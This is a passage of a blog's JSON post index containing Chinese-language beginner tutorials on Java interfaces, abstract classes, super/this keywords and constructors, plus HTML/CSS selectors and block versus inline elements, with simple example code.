MyInterfaceAbstract implements MyInterfaceA, MyInterfaceB &#123; @Override public void methodA() &#123; &#125; //只需要覆盖重写一次 @Override public void methodAbs() &#123; &#125; @Override public void methodDefault() &#123; &#125;&#125; 1234567891011121314package cn.itcast.day10.demo02;public interface MyInterfaceB &#123; public abstract void methodB(); public abstract void methodAbs(); public default void methodDefault() &#123; System.out.println(\"默认方法BBB\"); &#125;&#125; 1234567891011121314package cn.itcast.day10.demo02;public interface MyInterfaceA &#123; public abstract void methodA(); public abstract void methodAbs(); public default void methodDefault() &#123; System.out.println(\"默认方法AAA\"); &#125;&#125; 如果实现类没有覆盖重写所有接口当中的所有抽象方法，那么实现类就必须是一个抽象类。 12345package cn.itcast.day10.demo02;public abstract class MyInterfaceAbstract implements MyInterfaceA, MyInterfaceB &#123; //不重写抽象方法&#125; 如果实现类锁实现的多个接口当中，存在重复的默认方法，那么实现类一定要对冲突的默认方法进行覆盖重写。 12345678910package cn.itcast.day10.demo02;public interface MyInterfaceA &#123; public default void methodDefault() &#123; System.out.println(\"默认方法AAA\"); &#125;&#125; 12345678910package cn.itcast.day10.demo02;public interface MyInterfaceB &#123; public default void methodDefault() &#123; System.out.println(\"默认方法BBB\"); &#125;&#125; 1234567891011package cn.itcast.day10.demo02;public abstract class MyInterfaceAbstract implements MyInterfaceA, MyInterfaceB &#123; //重写默认方法 @Override public void methodDefault() &#123; &#125;&#125; 一个类如果直接父类当中的方法，和接口当中的默认方法产生了冲突，优先用父类当中的方法。 123456789package cn.itcast.day10.demo02;public interface MyInterface &#123; public default void method() &#123; System.out.println(\"接口的默认方法\"); &#125;&#125; 123456789package cn.itcast.day10.demo02;public class Fu &#123; public void method() &#123; System.out.println(\"父类方法\"); &#125;&#125; 1234package cn.itcast.day10.demo02;public class Zi extends Fu implements MyInterface &#123;&#125; 123456789101112package cn.itcast.day10.demo02;public class Demo01Interface &#123; public static void main(String[] args) &#123; Zi zi = new Zi(); //这里调用的是父类的method方法 zi.method(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的内容小结","slug":"java00100接口的内容小结","date":"2020-03-10T08:15:18.000Z","updated":"2020-03-10T09:38:56.219Z","comments":true,"path":"2020/03/10/java00100接口的内容小结/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00100接口的内容小结/","excerpt":"","text":"java接口的内容小结","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的常量定义和使用","slug":"java00099接口的常量定义和使用","date":"2020-03-10T08:10:04.000Z","updated":"2020-03-10T09:38:15.569Z","comments":true,"path":"2020/03/10/java00099接口的常量定义和使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00099接口的常量定义和使用/","excerpt":"","text":"java接口的常量定义和使用 接口当中也可以定义“成员变量”，但是必须使用public static final三个关键字进行修饰。 从效果上看，这其实就是接口的【常量】。 格式： public static final 数据类型 常量名称 = 数据值; 备注： 一旦使用final关键字进行修饰，说明不可改变。 使用接口常量格式: 接口名.常量名 注意事项： 接口当中的常量，可以省略public static final，注意：不写也照样是这样。 接口当中的常量，必须进行赋值；不能不赋值。 接口中常量的名称，使用完全大写的字母，用下划线进行分隔。（推荐命名规则） 12345678package cn.itcast.day10.demo01;public interface MyInterfaceConst &#123; // 这其实就是一个常量，一旦赋值，不可以修改 public static final int NUM_OF_MY_CLASS = 12;&#125; 1234567891011package cn.itcast.day10.demo01;public class Demo05Interface &#123; public static void main(String[] args) &#123; // 访问接口当中的常量 System.out.println(MyInterfaceConst.NUM_OF_MY_CLASS); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的私有方法使用","slug":"java00098接口的私有方法使用","date":"2020-03-10T08:00:22.000Z","updated":"2020-03-10T09:34:40.434Z","comments":true,"path":"2020/03/10/java00098接口的私有方法使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00098接口的私有方法使用/","excerpt":"","text":"java接口的私有方法使用 12345678910package cn.itcast.day10.demo01;public class MyInterfacePrivateAImpl implements MyInterfacePrivateA &#123; public void methodAnother() &#123; // 直接访问到了接口中的默认方法，这样是错误的！// methodCommon(); &#125;&#125; 123456789101112131415161718192021package cn.itcast.day10.demo01;public interface MyInterfacePrivateB &#123; public static void methodStatic1() &#123; System.out.println(\"静态方法1\"); methodStaticCommon(); &#125; public static void methodStatic2() &#123; System.out.println(\"静态方法2\"); methodStaticCommon(); &#125; private static void methodStaticCommon() &#123; System.out.println(\"AAA\"); System.out.println(\"BBB\"); System.out.println(\"CCC\"); &#125;&#125; 123456789101112package cn.itcast.day10.demo01;public class Demo04Interface &#123; public static void main(String[] args) &#123; MyInterfacePrivateB.methodStatic1(); MyInterfacePrivateB.methodStatic2(); // 错误写法！// MyInterfacePrivateB.methodStaticCommon(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的私有方法定义","slug":"java00097接口的私有方法定义","date":"2020-03-10T07:47:52.000Z","updated":"2020-03-10T09:33:17.716Z","comments":true,"path":"2020/03/10/java00097接口的私有方法定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00097接口的私有方法定义/","excerpt":"","text":"java接口的私有方法定义 问题描述： 我们需要抽取一个共有方法，用来解决两个默认方法之间重复代码的问题。 但是这个共有方法不应该让实现类使用，应该是私有化的。 解决方案： 从Java 9开始，接口当中允许定义私有方法。 普通私有方法，解决多个默认方法之间重复代码问题 格式： 123private 返回值类型 方法名称(参数列表) &#123; 方法体&#125; 静态私有方法，解决多个静态方法之间重复代码问题 格式： 123private static 返回值类型 方法名称(参数列表) &#123; 方法体&#125; 123456789101112131415161718192021package cn.itcast.day10.demo01;public interface MyInterfacePrivateA &#123; public default void methodDefault1() &#123; System.out.println(\"默认方法1\"); methodCommon(); &#125; public default void methodDefault2() &#123; System.out.println(\"默认方法2\"); methodCommon(); &#125; private void methodCommon() &#123; System.out.println(\"AAA\"); System.out.println(\"BBB\"); System.out.println(\"CCC\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的静态方法使用","slug":"java00096接口的静态方法使用","date":"2020-03-10T07:44:40.000Z","updated":"2020-03-10T09:28:23.701Z","comments":true,"path":"2020/03/10/java00096接口的静态方法使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00096接口的静态方法使用/","excerpt":"","text":"java接口的静态方法使用 注意事项： 不能通过接口实现类的对象来调用接口当中的静态方法。 正确用法： 通过接口名称，直接调用其中的静态方法。 格式： 接口名称.静态方法名(参数); 1234package cn.itcast.day10.demo01;public class MyInterfaceStaticImpl implements MyInterfaceStatic &#123;&#125; 1234567891011121314151617package cn.itcast.day10.demo01;public class Demo03Interface &#123; public static void main(String[] args) &#123; // 创建了实现类对象 MyInterfaceStaticImpl impl = new MyInterfaceStaticImpl(); // 错误写法！// impl.methodStatic(); // 直接通过接口名称调用静态方法 MyInterfaceStatic.methodStatic(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的静态方法定义","slug":"java00095接口的静态方法定义","date":"2020-03-10T07:42:39.000Z","updated":"2020-03-10T09:26:13.981Z","comments":true,"path":"2020/03/10/java00095接口的静态方法定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00095接口的静态方法定义/","excerpt":"","text":"java接口的静态方法定义 从Java 8开始，接口当中允许定义静态方法。 格式： 123public static 返回值类型 方法名称(参数列表) &#123; 方法体&#125; 提示：就是将abstract或者default换成static即可，带上方法体。 123456789package cn.itcast.day10.demo01;public interface MyInterfaceStatic &#123; public static void methodStatic() &#123; System.out.println(\"这是接口的静态方法！\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的默认方法使用","slug":"java00094接口的默认方法使用","date":"2020-03-10T07:42:07.000Z","updated":"2020-03-10T09:22:41.199Z","comments":true,"path":"2020/03/10/java00094接口的默认方法使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00094接口的默认方法使用/","excerpt":"","text":"java接口的默认方法使用 接口的默认方法，可以通过接口实现类对象，直接调用。 接口的默认方法，也可以被接口实现类进行覆盖重写。 12345678910111213package cn.itcast.day10.demo01;public class MyInterfaceDefaultB implements MyInterfaceDefault &#123; @Override public void methodAbs() &#123; System.out.println(\"实现了抽象方法，BBB\"); &#125; @Override public void methodDefault() &#123; System.out.println(\"实现类B覆盖重写了接口的默认方法\"); &#125;&#125; 12345678package cn.itcast.day10.demo01;public class MyInterfaceDefaultA implements MyInterfaceDefault &#123; @Override public void methodAbs() &#123; System.out.println(\"实现了抽象方法，AAA\"); &#125;&#125; 12345678910111213141516171819202122232425package cn.itcast.day10.demo01;/*从Java 8开始，接口里允许定义默认方法。格式：public default 返回值类型 方法名称(参数列表) &#123; 方法体&#125;备注：接口当中的默认方法，可以解决接口升级的问题。 */public interface MyInterfaceDefault &#123; // 抽象方法 public abstract void methodAbs(); // 新添加了一个抽象方法// public abstract void methodAbs2(); // 新添加的方法，改成默认方法 public default void methodDefault() &#123; System.out.println(\"这是新添加的默认方法\"); &#125;&#125; 12345678910111213141516171819package cn.itcast.day10.demo01;public class Demo02Interface &#123; public static void main(String[] args) &#123; // 创建了实现类对象 MyInterfaceDefaultA a = new MyInterfaceDefaultA(); a.methodAbs(); // 调用抽象方法，实际运行的是右侧实现类。 // 调用默认方法，如果实现类当中没有，会向上找接口 a.methodDefault(); // 这是新添加的默认方法 System.out.println(\"==========\"); MyInterfaceDefaultB b = new MyInterfaceDefaultB(); b.methodAbs(); b.methodDefault(); // 实现类B覆盖重写了接口的默认方法 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的默认方法定义","slug":"java00093接口的默认方法定义","date":"2020-03-10T07:31:05.000Z","updated":"2020-03-10T09:18:22.169Z","comments":true,"path":"2020/03/10/java00093接口的默认方法定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00093接口的默认方法定义/","excerpt":"","text":"java接口的默认方法定义 从Java 8开始，接口里允许定义默认方法。 格式： 123public default 返回值类型 方法名称(参数列表) &#123; 方法体&#125; 备注：接口当中的默认方法，可以解决接口升级的问题。 1234567891011121314151617package cn.itcast.day10.demo01;public interface MyInterfaceDefault &#123; // 抽象方法 public abstract void methodAbs(); // 新添加了一个抽象方法// public abstract void methodAbs2(); // 新添加的方法，改成默认方法 public default void methodDefault() &#123; System.out.println(\"这是新添加的默认方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的抽象方法使用","slug":"java00092接口的抽象方法使用","date":"2020-03-10T07:23:09.000Z","updated":"2020-03-10T09:39:27.098Z","comments":true,"path":"2020/03/10/java00092接口的抽象方法使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00092接口的抽象方法使用/","excerpt":"","text":"java接口的抽象方法使用 123456789101112131415161718192021222324252627package cn.itcast.day10.demo01;/*在任何版本的Java中，接口都能定义抽象方法。格式：public abstract 返回值类型 方法名称(参数列表);注意事项：1. 接口当中的抽象方法，修饰符必须是两个固定的关键字：public abstract2. 这两个关键字修饰符，可以选择性地省略。（今天刚学，所以不推荐。）3. 方法的三要素，可以随意定义。 */public interface MyInterfaceAbstract &#123; // 这是一个抽象方法 public abstract void methodAbs1(); // 这也是抽象方法 abstract void methodAbs2(); // 这也是抽象方法 public void methodAbs3(); // 这也是抽象方法 void methodAbs4();&#125; 1234567891011121314151617181920212223package cn.itcast.day10.demo01;public class MyInterfaceAbstractImpl implements MyInterfaceAbstract &#123; @Override public void methodAbs1() &#123; System.out.println(\"这是第一个方法！\"); &#125; @Override public void methodAbs2() &#123; System.out.println(\"这是第二个方法！\"); &#125; @Override public void methodAbs3() &#123; System.out.println(\"这是第三个方法！\"); &#125; @Override public void methodAbs4() &#123; System.out.println(\"这是第四个方法！\"); &#125;&#125; 1234567891011121314package cn.itcast.day10.demo01;public class Demo01Interface &#123; public static void main(String[] args) &#123; // 错误写法！不能直接new接口对象使用。// MyInterfaceAbstract inter = new MyInterfaceAbstract(); // 创建实现类的对象使用 MyInterfaceAbstractImpl impl = new MyInterfaceAbstractImpl(); impl.methodAbs1(); impl.methodAbs2(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的抽象方法定义","slug":"java00091接口的抽象方法定义","date":"2020-03-10T07:18:29.000Z","updated":"2020-03-10T09:07:33.695Z","comments":true,"path":"2020/03/10/java00091接口的抽象方法定义/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00091接口的抽象方法定义/","excerpt":"","text":"java接口的抽象方法定义 在任何版本的Java中，接口都能定义抽象方法。 格式： public abstract 返回值类型 方法名称(参数列表); 注意事项： 接口当中的抽象方法，修饰符必须是两个固定的关键字：public abstract 这两个关键字修饰符，可以选择性地省略。 方法的三要素，可以随意定义。 123456789101112131415161718package cn.itcast.day10.demo01;public interface MyInterfaceAbstract &#123; // 这是一个抽象方法 public abstract void methodAbs1(); // 这也是抽象方法 abstract void methodAbs2(); // 这也是抽象方法 public void methodAbs3(); // 这也是抽象方法 void methodAbs4();&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口的定义基本格式","slug":"java00090接口的定义基本格式","date":"2020-03-10T07:17:37.000Z","updated":"2020-03-10T09:04:55.060Z","comments":true,"path":"2020/03/10/java00090接口的定义基本格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00090接口的定义基本格式/","excerpt":"","text":"java接口的定义基本格式 接口就是多个类的公共规范。 接口是一种引用数据类型，最重要的内容就是其中的：抽象方法。 如何定义一个接口的格式： 123public interface 接口名称 &#123; // 接口内容&#125; 备注：换成了关键字interface之后，编译生成的字节码文件仍然是：.java --&gt; .class。 如果是Java 7，那么接口中可以包含的内容有： 常量 抽象方法 如果是Java 8，还可以额外包含有： 默认方法 静态方法 如果是Java 9，还可以额外包含有： 私有方法 接口使用步骤： 接口不能直接使用，必须有一个“实现类”来“实现”该接口。 格式： 123public class 实现类名称 implements 接口名称 &#123; // ...&#125; 接口的实现类必须覆盖重写（实现）接口中所有的抽象方法。 实现：去掉abstract关键字，加上方法体大括号。 创建实现类的对象，进行使用。 注意事项： 如果实现类并没有覆盖重写接口中所有的抽象方法，那么这个实现类自己就必须是抽象类。","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java接口概述与生活举例","slug":"java00089接口概述与生活举例","date":"2020-03-10T07:14:15.000Z","updated":"2020-03-10T08:17:19.335Z","comments":true,"path":"2020/03/10/java00089接口概述与生活举例/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/10/java00089接口概述与生活举例/","excerpt":"","text":"java接口概述与生活举例","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java抽象方法和抽象类的注意事项","slug":"java00088抽象方法和抽象类的注意事项","date":"2020-03-09T09:34:14.000Z","updated":"2020-03-09T11:17:06.579Z","comments":true,"path":"2020/03/09/java00088抽象方法和抽象类的注意事项/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00088抽象方法和抽象类的注意事项/","excerpt":"","text":"java抽象方法和抽象类的注意事项 12345678910package cn.itcast.day09.demo12;public class DemoMain &#123; public static void main(String[] args) &#123; Zi zi = new Zi(); zi.eat(); &#125;&#125; 12345678910package cn.itcast.day09.demo12;/*一个抽象类不一定含有抽象方法，只要保证抽象方法所在的类是抽象类，即可。这样没有抽象方法的抽象类，也不能直接创建对象，在一些特殊场景下有用途。 */public abstract class MyAbstract &#123;&#125; 1234567891011package cn.itcast.day09.demo12;public abstract class Fu &#123; public Fu() &#123; System.out.println(\"抽象父类构造方法执行！\"); &#125; public abstract void eat();&#125; 1234567891011121314package cn.itcast.day09.demo12;public class Zi extends Fu &#123; public Zi() &#123; // super(); System.out.println(\"子类构造方法执行\"); &#125; @Override public void eat() &#123; System.out.println(\"吃饭饭\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java抽象方法和抽象类的使用","slug":"java00087抽象方法和抽象类的使用","date":"2020-03-09T09:24:02.000Z","updated":"2020-03-09T11:13:02.607Z","comments":true,"path":"2020/03/09/java00087抽象方法和抽象类的使用/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00087抽象方法和抽象类的使用/","excerpt":"","text":"java抽象方法和抽象类的使用 抽象方法：就是加上abstract关键字，然后去掉大括号，直接分号结束。 抽象类：抽象方法所在的类，必须是抽象类才行。在class之前写上abstract即可。 如何使用抽象类和抽象方法： 不能直接创建new抽象类对象。 必须用一个子类来继承抽象父类。 子类必须覆盖重写抽象父类当中所有的抽象方法。 覆盖重写（实现）：子类去掉抽象方法的abstract关键字，然后补上方法体大括号。 创建子类对象进行使用。 12345678910111213package cn.itcast.day09.demo11;public abstract class Animal &#123; // 这是一个抽象方法，代表吃东西，但是具体吃什么（大括号的内容）不确定。 public abstract void eat(); // 这是普通的成员方法// public void normalMethod() &#123;//// &#125;&#125; 12345678910package cn.itcast.day09.demo11;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125;&#125; 123456789101112package cn.itcast.day09.demo11;public class DemoMain &#123; public static void main(String[] args) &#123;// Animal animal = new Animal(); // 错误写法！不能直接创建抽象类对象 Cat cat = new Cat(); cat.eat(); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java抽象方法和抽象类的定义格式","slug":"java00086抽象方法和抽象类的定义格式","date":"2020-03-09T09:17:55.000Z","updated":"2020-03-09T11:12:22.050Z","comments":true,"path":"2020/03/09/java00086抽象方法和抽象类的定义格式/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00086抽象方法和抽象类的定义格式/","excerpt":"","text":"java抽象方法和抽象类的定义格式 抽象方法：就是加上abstract关键字，然后去掉大括号，直接分号结束。 抽象类：抽象方法所在的类，必须是抽象类才行。在class之前写上abstract即可。 如何使用抽象类和抽象方法： 不能直接创建new抽象类对象。 必须用一个子类来继承抽象父类。 子类必须覆盖重写抽象父类当中所有的抽象方法。 覆盖重写（实现）：子类去掉抽象方法的abstract关键字，然后补上方法体大括号。 创建子类对象进行使用。 12345678910111213package cn.itcast.day09.demo11;public abstract class Animal &#123; // 这是一个抽象方法，代表吃东西，但是具体吃什么（大括号的内容）不确定。 public abstract void eat(); // 这是普通的成员方法// public void normalMethod() &#123;//// &#125;&#125; 12345678910package cn.itcast.day09.demo11;public class Cat extends Animal &#123; @Override public void eat() &#123; System.out.println(\"猫吃鱼\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java抽象的概念","slug":"java00085抽象的概念","date":"2020-03-09T09:14:57.000Z","updated":"2020-03-09T11:11:49.970Z","comments":true,"path":"2020/03/09/java00085抽象的概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00085抽象的概念/","excerpt":"","text":"java抽象的概念","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"java继承的三个特点","slug":"java00084继承的三个特点","date":"2020-03-09T09:12:11.000Z","updated":"2020-03-09T10:53:28.821Z","comments":true,"path":"2020/03/09/java00084继承的三个特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00084继承的三个特点/","excerpt":"","text":"java继承的三个特点","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"super与this关键字的图解","slug":"java00083super与this关键字的图解","date":"2020-03-09T09:11:29.000Z","updated":"2020-03-09T10:49:27.402Z","comments":true,"path":"2020/03/09/java00083super与this关键字的图解/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00083super与this关键字的图解/","excerpt":"","text":"super与this关键字的图解 123456789101112package cn.itcast.day09.demo10;public class Demo &#123; public static void main(String[] args) &#123; Zi zi = new Zi(); zi.show(); zi.method(); &#125;&#125; 1234567891011package cn.itcast.day09.demo10;public class Fu &#123; int num = 10; public void method() &#123; System.out.println(\"父类方法\"); &#125;&#125; 1234567891011121314151617181920package cn.itcast.day09.demo10;public class Zi extends Fu &#123; int num = 20; @Override public void method() &#123; super.method(); // 调用了父类方法 System.out.println(\"子类方法\"); &#125; public void show() &#123; int num = 30; System.out.println(num); // 30 System.out.println(this.num); // 20 System.out.println(super.num); // 10 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"this关键字的三种用法","slug":"java00082this关键字的三种用法","date":"2020-03-09T09:10:59.000Z","updated":"2020-03-09T10:45:05.595Z","comments":true,"path":"2020/03/09/java00082this关键字的三种用法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00082this关键字的三种用法/","excerpt":"","text":"this关键字的三种用法 super关键字用来访问父类内容，而this关键字用来访问本类内容。用法也有三种： 在本类的成员方法中，访问本类的成员变量。 在本类的成员方法中，访问本类的另一个成员方法。 在本类的构造方法中，访问本类的另一个构造方法。 在第三种用法当中要注意： A. this(…)调用也必须是构造方法的第一个语句，唯一一个。 B. super和this两种构造调用，不能同时使用。 1234567package cn.itcast.day09.demo09;public class Fu &#123; int num = 30;&#125; 12345678910111213141516171819202122232425262728293031323334353637package cn.itcast.day09.demo09;public class Zi extends Fu &#123; int num = 20; public Zi() &#123;// super(); // 这一行不再赠送 this(123); // 本类的无参构造，调用本类的有参构造// this(1, 2); // 错误写法！ &#125; public Zi(int n) &#123; this(1, 2); &#125; public Zi(int n, int m) &#123; &#125; public void showNum() &#123; int num = 10; System.out.println(num); // 局部变量 System.out.println(this.num); // 本类中的成员变量 System.out.println(super.num); // 父类中的成员变量 &#125; public void methodA() &#123; System.out.println(\"AAA\"); &#125; public void methodB() &#123; this.methodA(); System.out.println(\"BBB\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"super关键字的三种用法","slug":"java00081super关键字的三种用法","date":"2020-03-09T09:10:33.000Z","updated":"2020-03-09T10:40:59.175Z","comments":true,"path":"2020/03/09/java00081super关键字的三种用法/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00081super关键字的三种用法/","excerpt":"","text":"super关键字的三种用法 super关键字的用法有三种： 在子类的成员方法中，访问父类的成员变量。 在子类的成员方法中，访问父类的成员方法。 在子类的构造方法中，访问父类的构造方法。 1234567891011package cn.itcast.day09.demo08;public class Fu &#123; int num = 10; public void method() &#123; System.out.println(\"父类方法\"); &#125;&#125; 123456789101112131415161718192021package cn.itcast.day09.demo08;public class Zi extends Fu &#123; int num = 20; public Zi() &#123; super(); &#125; public void methodZi() &#123; System.out.println(super.num); // 父类中的num &#125; public void method() &#123; super.method(); // 访问父类中的method System.out.println(\"子类方法\"); &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"继承中构造方法的访问特点","slug":"java00080继承中构造方法的访问特点","date":"2020-03-09T08:32:49.000Z","updated":"2020-03-09T08:40:02.049Z","comments":true,"path":"2020/03/09/java00080继承中构造方法的访问特点/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/09/java00080继承中构造方法的访问特点/","excerpt":"","text":"继承中构造方法的访问特点 继承关系中，父子类构造方法的访问特点： 子类构造方法当中有一个默认隐含的“super()”调用，所以一定是先调用的父类构造，后执行的子类构造。 子类构造可以通过super关键字来调用父类重载构造。 super的父类构造调用，必须是子类构造方法的第一个语句。不能一个子类构造调用多次super构造。 总结： 子类必须调用父类构造方法，不写则赠送super()；写了则用写的指定的super调用，super只能有一个，还必须是第一个。 1234567public class Demo01Constructor &#123; public static void main(String[] args) &#123; Zi zi = new Zi(); &#125;&#125; 12345678910111213package cn.itcast.day09.demo07;public class Fu &#123; public Fu() &#123; System.out.println(\"父类无参构造\"); &#125; public Fu(int num) &#123; System.out.println(\"父类有参构造！\"); &#125;&#125; 123456789101112131415package cn.itcast.day09.demo07;public class Zi extends Fu &#123; public Zi() &#123; super(); // 在调用父类无参构造方法// super(20); // 在调用父类重载的构造方法 System.out.println(\"子类构造方法！\"); &#125; public void method() &#123;// super(); // 错误写法！只有子类构造方法，才能调用父类构造方法。 &#125;&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://xiaowuyoucy.github.io/categories/Java/"}],"tags":[]},{"title":"常用选择器","slug":"html-css00018常用选择器","date":"2020-03-07T14:29:08.000Z","updated":"2020-05-29T23:05:20.938Z","comments":true,"path":"2020/03/07/html-css00018常用选择器/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/07/html-css00018常用选择器/","excerpt":"","text":"常用选择器 元素选择器 作用：根据标签名来选中指定的元素 语法：标签名{} 例子：p{} h1{} div{} 1234567 p&#123;color: red;&#125;h1&#123;color: green;&#125; id选择器 作用：根据元素的id属性值选中一个元素 语法：#id属性值{} 调用:id=&quot;属性值&quot; 例子：#box{} #red{} 123#red&#123;color: red;&#125; 类选择器 作用：根据元素的class属性值选中一组元素 id是唯一性的,所以只能应用到一个元素上 语法：.class属性值 调用: class=&quot;属性值1 [属性值2 属性值n]&quot; 1234567 .blue&#123;color: blue;&#125;.abc&#123;font-size: 20px;&#125; 复合选择器(并集选择器) 语法: 选择器1,选择器2,选择器n{} 123.class,h1,#a&#123;background-color: red;&#125; 复合选择器(交集选择器) 作用:可以选中同时满足多个选择器的元素 语法: 选择器1选择器2选择器N{} 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt; &lt;/title&gt; &lt;style type=\"text/css\"&gt; span.p3&#123; background-color:red; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;span class=\"p3\"&gt;I love you!&lt;/span&gt; &lt;/body&gt;&lt;/html&gt; 通配选择器 作用：选中页面中的所有元素 语法: *{} 123*&#123;color: red;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;style&gt; /* 将所有的段落设置为红色（字体） 元素选择器 作用：根据标签名来选中指定的元素 语法：标签名&#123;&#125; 例子：p&#123;&#125; h1&#123;&#125; div&#123;&#125; */ /* p&#123; color: red; &#125; h1&#123; color: green; &#125; */ /* 将儿童相见不相识设置红色 id选择器 作用：根据元素的id属性值选中一个元素 语法：#id属性值&#123;&#125; 例子：#box&#123;&#125; #red&#123;&#125; */ /* #red&#123; color: red; &#125; */ /* 将 秋水... 和 落霞... 设置为蓝色 类选择器 作用：根据元素的class属性值选中一组元素 语法：.class属性值 */ /* .blue&#123; color: blue; &#125; .abc&#123; font-size: 20px; &#125; */ /* 通配选择器 作用：选中页面中的所有元素 语法: * */ *&#123; color: red; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;h1 class=\"blue abc\"&gt;我是标题&lt;/h1&gt; &lt;p&gt;少小离家老大回&lt;/p&gt; &lt;p&gt;乡音无改鬓毛衰&lt;/p&gt; &lt;p id=\"red\"&gt;儿童相见不相识&lt;/p&gt; &lt;p&gt;笑问客从何处来&lt;/p&gt; &lt;!-- class 是一个标签的属性，它和id类似，不同的是class可以重复使用 可以通过class属性来为元素分组 可以同时为一个元素指定多个class属性 --&gt; &lt;p class=\"blue\"&gt;秋水共长天一色&lt;/p&gt; &lt;p class=\"blue\"&gt;落霞与孤鹜齐飞&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;","categories":[{"name":"HTML/CSS","slug":"HTML-CSS","permalink":"https://xiaowuyoucy.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"内联和块元素","slug":"html-css00017内联和块元素","date":"2020-03-07T14:11:22.000Z","updated":"2020-03-07T14:26:03.261Z","comments":true,"path":"2020/03/07/html-css00017内联和块元素/","link":"","permalink":"https://xiaowuyoucy.github.io/2020/03/07/html-css00017内联和块元素/","excerpt":"","text":"内联和块元素 块元素和内联元素 div就是一个块元素 所谓的块元素就是会独占一行的元素,无论他的内容有多少他都会独占一行. 常见的块元素: p h1 h2 h3 ... div这个标签没有任何语义,就是一个纯粹的块元素, 并且不会为它里边的元素设置任何的默认样式 div元素主要用来对页面进行布局的 span是一个内联元素(行内元素) 所谓的行内元素,指的是只占自身大小的元素,不会占用一行. 常见的内联元素: a img iframe span span没有任何的语义,span标签专门用来选中文字, 然后为文字来设置样式. 块元素主要用来做页面布局的,内联元素主要用来选中文本设置样式. 一般情况下只使用块元素去包含内联元素,而不会使用内联元素去包含一个块元素 a元素可以包含任意元素,除了他本身 